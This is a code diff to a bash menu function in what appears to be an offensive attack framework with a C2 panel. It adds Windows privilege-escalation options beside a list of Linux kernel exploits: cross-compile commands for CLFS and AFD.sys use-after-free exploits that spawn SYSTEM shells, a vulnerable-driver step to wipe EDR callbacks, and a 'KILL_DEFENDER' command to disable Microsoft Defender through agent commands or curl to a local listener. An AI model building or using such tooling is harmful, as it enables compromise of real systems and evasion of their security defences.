@@ -4872,7 +4872,7 @@ kernel_exploit() {
     info "Target kernel: $(uname -r)"
     echo ""
 
-    echo -e "  Select exploit:"
+    echo -e "  ${Y}--- Linux LPE ---${N}"
     echo -e "  ${C}[1]${N} CVE-2016-5195  DirtyCow         (kernel 2.6.22–4.8.3, race /proc/self/mem)"
     echo -e "  ${C}[2]${N} CVE-2022-0847  DirtyPipe        (kernel 5.8–5.16.11, page cache overwrite)"
     echo -e "  ${C}[3]${N} CVE-2021-3493  OverlayFS        (Ubuntu 16–20, xattr capability bypass)"
@@ -4881,23 +4881,50 @@ kernel_exploit() {
     echo -e "  ${C}[6]${N} CVE-2024-1086  nftables UAF     (kernel 5.14–6.6, verdict double-free)"
     echo -e "  ${C}[7]${N} CVE-2021-22555 Netfilter heap   (kernel 2.6.19–5.12, xt_compat OOB)"
     echo -e "  ${C}[8]${N} CVE-2022-2588  cls_route UAF    (kernel 4.9–5.18, tc classifier UAF)"
-    echo -e "  ${C}[9]${N} Run kernel_check first then auto-select best"
+    echo -e ""
+    echo -e "  ${Y}--- Windows LPE (fully patched targets) ---${N}"
+    echo -e "  ${C}[9]${N} CVE-2023-28252 CLFS UAF         (Win10/11 incl. 22H2 pre-Apr23, Lazarus/Nokoyawa)"
+    echo -e "  ${C}[10]${N} CVE-2024-38193 AFD.sys UAF     (Win10/11 incl. 23H2 pre-Aug24, Lazarus 2024)"
+    echo -e "  ${C}[11]${N} BYOVD  EDR Callback Wipe       (any Windows, fully patched — needs driver)"
+    echo -e "  ${C}[12]${N} KILL_DEFENDER  Full 6-layer    (via agent command — Windows agent required)"
+    echo -e ""
+    echo -e "  ${C}[0]${N} Run kernel_check first then auto-select best"
     echo ""
-    ask "Choice [1-9]:"
+    ask "Choice [0-12]:"
     read -r EXP_CHOICE
 
     local src="" name="" cve="" extra_flags=""
     case "$EXP_CHOICE" in
-        1) src="$EXPLOIT_DIR/dirty_cow.c"        name="dirty_cow"      cve="CVE-2016-5195" ;;
-        2) src="$EXPLOIT_DIR/dirty_pipe.c"        name="dirty_pipe"     cve="CVE-2022-0847" ;;
-        3) src="$EXPLOIT_DIR/overlayfs.c"         name="overlayfs"      cve="CVE-2021-3493" ;;
-        4) name="pwnkit" cve="CVE-2021-4034" ;;
-        5) src="$EXPLOIT_DIR/overlayfs2.c"        name="overlayfs2"     cve="CVE-2023-0386"  extra_flags="-lfuse3 -D_FILE_OFFSET_BITS=64" ;;
-        6) src="$EXPLOIT_DIR/nftables_uaf.c"      name="nftables_uaf"   cve="CVE-2024-1086" ;;
-        7) src="$EXPLOIT_DIR/netfilter_heap.c"    name="netfilter_heap" cve="CVE-2021-22555" ;;
-        8) src="$EXPLOIT_DIR/route4_uaf.c"        name="route4_uaf"     cve="CVE-2022-2588" ;;
-        9) kernel_check; echo ""; ask "Now select exploit [1-8]:"; read -r EXP_CHOICE
-           case "$EXP_CHOICE" in
+        1)  src="$EXPLOIT_DIR/dirty_cow.c"        name="dirty_cow"      cve="CVE-2016-5195" ;;
+        2)  src="$EXPLOIT_DIR/dirty_pipe.c"        name="dirty_pipe"     cve="CVE-2022-0847" ;;
+        3)  src="$EXPLOIT_DIR/overlayfs.c"         name="overlayfs"      cve="CVE-2021-3493" ;;
+        4)  name="pwnkit" cve="CVE-2021-4034" ;;
+        5)  src="$EXPLOIT_DIR/overlayfs2.c"        name="overlayfs2"     cve="CVE-2023-0386"  extra_flags="-lfuse3 -D_FILE_OFFSET_BITS=64" ;;
+        6)  src="$EXPLOIT_DIR/nftables_uaf.c"      name="nftables_uaf"   cve="CVE-2024-1086" ;;
+        7)  src="$EXPLOIT_DIR/netfilter_heap.c"    name="netfilter_heap" cve="CVE-2021-22555" ;;
+        8)  src="$EXPLOIT_DIR/route4_uaf.c"        name="route4_uaf"     cve="CVE-2022-2588" ;;
+        9)  echo -e "\n  ${W}CVE-2023-28252 CLFS LPE — Windows cross-compile:${N}"
+            echo -e "    x86_64-w64-mingw32-gcc -O2 $EXPLOIT_DIR/clfs_lpe.c -lpsapi -o /tmp/clfs_lpe.exe"
+            echo -e "  ${Y}Transfer to Windows target and run as admin${N}"
+            echo -e "  Spawns SYSTEM shell via CLFS UAF + kernel heap spray + token steal"
+            return 0 ;;
+        10) echo -e "\n  ${W}CVE-2024-38193 AFD.sys LPE — Windows cross-compile:${N}"
+            echo -e "    x86_64-w64-mingw32-gcc -O2 $EXPLOIT_DIR/afd_lpe.c -lws2_32 -lpsapi -o /tmp/afd_lpe.exe"
+            echo -e "  ${Y}Transfer to Windows target and run as admin${N}"
+            echo -e "  Spawns SYSTEM shell via AFD.sys UAF + kernel pool spray"
+            return 0 ;;
+        11) echo -e "\n  ${W}BYOVD Kernel Callback Wipe${N}"
+            echo -e "  Send from C2 panel to Windows agent:"
+            echo -e "    BYOVD  (requires RTCore64.sys at %%TEMP%%\\RTCore64.sys)"
+            echo -e "  Or: curl http://localhost:8888/byovd?action=remove_callbacks"
+            return 0 ;;
+        12) echo -e "\n  ${W}KILL_DEFENDER — Full 6-layer Defender elimination${N}"
+            echo -e "  Send from C2 panel to Windows agent: KILL_DEFENDER"
+            echo -e "  Or single layers: KILL_DEFENDER byovd|kill_procs|tamper|registry|wdfilter|etw"
+            echo -e "  Or: curl http://localhost:8888/defender/all"
+            return 0 ;;
+        0)  kernel_check; echo ""; ask "Now select exploit [1-8]:"; read -r EXP_CHOICE
+            case "$EXP_CHOICE" in
                1) src="$EXPLOIT_DIR/dirty_cow.c"     name="dirty_cow"      cve="CVE-2016-5195" ;;
                2) src="$EXPLOIT_DIR/dirty_pipe.c"    name="dirty_pipe"     cve="CVE-2022-0847" ;;
                3) src="$EXPLOIT_DIR/overlayfs.c"     name="overlayfs"      cve="CVE-2021-3493" ;;
@@ -4906,7 +4933,7 @@ kernel_exploit() {
                6) src="$EXPLOIT_DIR/nftables_uaf.c"  name="nftables_uaf"   cve="CVE-2024-1086" ;;
                7) src="$EXPLOIT_DIR/netfilter_heap.c" name="netfilter_heap" cve="CVE-2021-22555" ;;
                8) src="$EXPLOIT_DIR/route4_uaf.c"    name="route4_uaf"     cve="CVE-2022-2588" ;;
-           esac ;;
+            esac ;;
         *) err "Invalid choice"; return 1 ;;
     esac
 
